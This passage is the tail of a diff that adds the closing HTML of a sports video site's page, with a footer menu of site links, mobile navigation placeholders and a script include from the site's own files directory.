+//--><!]]>
+</script>  </div>
+</div>
+<div id="block-menu-menu-footer-menu" class="block block-menu">
+
+    
+  <div class="content">
+    <ul class="menu nav"><li class="first leaf"><a href="/about" title="">About</a></li>
+<li class="leaf"><a href="/syndication" title="">Syndicate Our Player</a></li>
+<li class="leaf"><a href="http://eversport.tv/eversport-help" title="">Help</a></li>
+<li class="leaf"><a href="/contact" title="">Contact Us</a></li>
+<li class="leaf"><a href="/careers" title="">Careers</a></li>
+<li class="leaf"><a href="/press" title="">Press</a></li>
+<li class="leaf"><a href="/content/terms-service" title="">Terms of Service</a></li>
+<li class="last leaf"><a href="/content/privacy-policy" title="">Privacy Policy</a></li>
+</ul>  </div>
+</div>
+  </div>
+                      </nav>
+        </div>
+      </div>
+    </div>
+  </footer>
+</div>
+<div id="site-mobile-nav" class="site-mobile-nav">
+  <div data-js-responsive-move="main-nav" class="site-mobile-nav__main-nav"></div>
+  <div data-js-responsive-move="adjacent-nav" class="site-mobile-nav__adjacent-nav"></div>
+</div>
+    <script type="text/javascript" src="http://eversport.tv/sites/default/files/js/js_pMpn-aGMsGKgMnAtmxLe-SZAZXUOnXxQqYAoiRN9DJI.js"></script>
+  </body>
+</html>
